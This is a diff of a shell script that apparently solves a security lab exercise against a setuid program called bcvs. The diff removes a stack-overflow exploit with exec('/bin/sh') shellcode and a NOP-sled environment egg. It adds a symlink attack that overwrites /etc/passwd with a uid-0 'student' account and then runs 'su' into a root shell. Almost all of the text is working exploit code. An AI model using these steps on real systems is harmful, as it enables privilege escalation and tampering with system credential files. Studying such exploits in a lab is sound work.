@@ -2,118 +2,73 @@
 
 cd /opt/bcvs
 
-touch shellcode.c
-cat <<EOF>> shellcode.c
-/**
- *           [ http://www.hacknroll.com ]
- *
- * Description:
- *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes
- *
- * Authors:
- *    Maycon M. Vitali ( 0ut0fBound )
- *        Milw0rm .: http://www.milw0rm.com/author/869
- *        Page ....: http://maycon.hacknroll.com
- *        Email ...: maycon@hacknroll.com
- *
- *    Anderson Eduardo ( c0d3_z3r0 )
- *        Milw0rm .: http://www.milw0rm.com/author/1570
- *        Page ....: http://anderson.hacknroll.com
- *        Email ...: anderson@hacknroll.com
- * 
- * -------------------------------------------------------
- *   
- * amd64# gcc hacknroll.c -o hacknroll
- * amd64# ./hacknroll
- * # exit
- * amd64#
- *
- * -------------------------------------------------------
- */
-#include <stdlib.h>
-
-#define DEFAULT_OFFSET                    0
-#define DEFAULT_BUFFER_SIZE             512
-#define DEFAULT_EGG_SIZE               2048
-#define NOP                            0x90
-
-const char shellcode[] =
-        "\x48\x31\xc0"                               // xor    %rax,%rax
-        "\x99"                                       // cltd
-        "\xb0\x3b"                                   // mov    $0x3b,%al
-        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
-        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
-        "\x57"                                       // push   %rdi
-        "\x48\x89\xe7"                               // mov    %rsp,%rdi
-        "\x57"                                       // push   %rdi
-        "\x52"                                       // push   %rdx
-        "\x48\x89\xe6"                               // mov    %rsp,%rsi
-        "\x0f\x05";                                  // syscall
-
-unsigned long get_esp(void) {
-   __asm__("movl %esp,%eax");
-}
-
-void main(int argc, char *argv[]) {
-  char *buff, *ptr, *egg;
-  long *addr_ptr, addr;
-  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-  int i, eggsize=DEFAULT_EGG_SIZE;
-
-  if (argc > 1) bsize   = atoi(argv[1]);
-  if (argc > 2) offset  = atoi(argv[2]);
-  if (argc > 3) eggsize = atoi(argv[3]);
-
-
-  if (!(buff = malloc(bsize))) {
-    printf("Can't allocate memory.\n");
-    exit(0);
-  }
-  if (!(egg = malloc(eggsize))) {
-    printf("Can't allocate memory.\n");
-    exit(0);
-  }
-
-  addr = get_esp() - offset;
-  printf("Using address: 0x%x\n", addr);
-
-  ptr = buff;
-  addr_ptr = (long *) ptr;
-  for (i = 0; i < bsize; i+=4)
-    *(addr_ptr++) = addr;
-
-  ptr = egg;
-  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
-    *(ptr++) = NOP;
-
-  for (i = 0; i < strlen(shellcode); i++)
-    *(ptr++) = shellcode[i];
-
-  buff[bsize - 1] = '\0';
-  egg[eggsize - 1] = '\0';
-
-  memcpy(egg,"EGG=",4);
-  putenv(egg);
-  memcpy(buff,"RET=",4);
-  putenv(buff);
-  system("/bin/bash");
-}
-
-EOF
-
-gcc -o shellcode shellcode.c
-./shellcode 432
-
-touch expfile.exp
-cat <<EOF>> expfile.exp
+touch file.txt
+ln -s file.txt block.list
+touch exp1.exp
+cat <<EOF >> exp1.exp
 #!/usr/bin/expect -f
 set timeout -1
-spawn ./bcvs ci $RET
+spawn ./bcvs ci block.list
 
 expect "Please write a SHORT explanation:\r"
 send -- "anything\r"
 expect eof
 EOF
 
-chmod +x expfile.exp
-./expfile.exp
+chmod +x exp1.exp
+./exp1.exp
+
+touch passwd
+
+PASSWORD="passwd"
+
+echo root:x:0:0::/root:/bin/bash >> $PASSWORD
+echo student:x:0:0::/root:/bin/bash >> $PASSWORD
+
+touch exp2.exp
+cat <<EOF >> exp2.exp
+#!/usr/bin/expect -f
+set timeout -1
+spawn ./bcvs ci passwd
+send -- "anything\r"
+expect eof
+EOF
+
+chmod +x exp2.exp
+./exp2.exp
+
+rm passwd
+ln -s /etc/passwd passwd
+
+touch exp3.exp
+cat <<EOF >> exp3.exp
+#!/usr/bin/expect -f
+set timeout -1
+spawn ./bcvs co passwd
+
+expect "Please write a SHORT explanation:\r"
+send -- "anything\r"
+expect eof
+EOF
+
+touch exp4.exp
+cat <<EOF >> exp4.exp
+#!/usr/bin/expect -f
+set timeout -1
+spawn su student
+expect "Password:"
+send -- "security\r"
+interact
+expect eof
+EOF
+
+chmod +x exp3.exp
+chmod +x exp4.exp
+./exp3.exp
+./exp4.exp
+rm exp1.exp
+rm exp2.exp
+rm exp3.exp
+rm exp4.exp
+rm passwd
+rm block.list
